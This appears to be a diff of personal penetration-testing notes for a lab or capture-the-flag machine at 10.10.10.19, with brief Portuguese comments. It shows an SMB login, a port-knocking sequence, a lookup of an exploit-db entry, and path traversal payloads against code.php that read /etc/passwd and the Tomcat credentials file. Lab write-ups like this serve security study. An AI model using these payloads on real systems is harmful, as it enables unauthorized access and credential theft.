@@ -64,5 +64,17 @@ user:[qiu] rid:[0x3e9]
 smbclient \\\\10.10.10.19\\qiu -U qiu
 
 
-knock 10.10.10.19 159 27391 4
+knock 10.10.10.19 159 27391 4 -v
 
+
+locate 18660.txt
+/usr/share/exploitdb/exploits/php/webapps/18660.txt
+                                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ cat /usr/share/exploitdb/exploits/php/webapps/18660.txt
+
+/windows/code.php?file=../../../../../../etc/passwd
+
+lembra da porta 8080 la tinha um caminho com usar, então vamos copiar aquele caminho e colar 
+
+http://10.10.10.19/nomercy/windows/code.php?file=../../../../../..//etc/tomcat7/tomcat-users.xml
